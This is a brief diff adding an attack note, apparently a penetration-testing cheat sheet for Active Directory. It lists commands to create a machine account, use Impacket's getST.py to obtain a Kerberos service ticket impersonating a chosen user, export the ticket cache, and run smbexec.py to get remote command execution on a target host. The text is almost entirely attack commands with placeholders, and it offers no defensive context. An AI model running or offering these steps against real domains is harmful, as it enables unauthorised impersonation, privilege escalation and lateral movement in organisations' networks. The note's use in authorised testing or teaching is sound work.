@@ -1,0 +1,14 @@
+First create a machine and add it to
+ 
+
+
+getST.py -impersonate {USER} -spn {SERVICE}/{HOST} '{DOMAIN}/{COMPUTER-ACCOUNT}:{PASSWORD}'
+
+
+export KRB5CCNAME='{USER}.ccache'
+
+
+
+smbexec.py {HOST} -no-pass -k -share {SHARE THAT YOU CAN ACCESS}
+or 
+ANY COMMAND THAT RUN WITH TICKETS
